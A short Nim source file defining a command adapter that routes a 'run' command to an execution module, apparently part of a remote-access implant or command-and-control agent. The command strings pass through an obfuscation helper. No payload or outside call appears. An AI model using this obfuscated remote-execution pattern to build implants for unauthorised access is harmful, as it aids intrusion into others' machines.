#[
    Adapter: ExecutionCommandAdapter
    Wraps execution modules (run)
    Implements CommandModulePort to normalize interfaces
    Applies Dependency Inversion Principle
]#

import options
import ../../../domain/models/network_command_context
import ../../modules/execution/run
from ../string_obfuscation_adapter import obf

type
    ExecutionCommandAdapter* = object
        ## Adapter for execution command modules
        discard

proc newExecutionCommandAdapter*(): ExecutionCommandAdapter =
    ## Create a new ExecutionCommandAdapter instance
    result = ExecutionCommandAdapter()

proc executeCommand*(adapter: ExecutionCommandAdapter, cmd: string, args: seq[string], cmdGuid: string, ctx: Option[NetworkCommandContext]): string =
    ## Execute an execution command
    case cmd:
    of obf("run"):
        result = run(args)
    else:
        result = obf("ERROR: Unknown execution command: ") & cmd

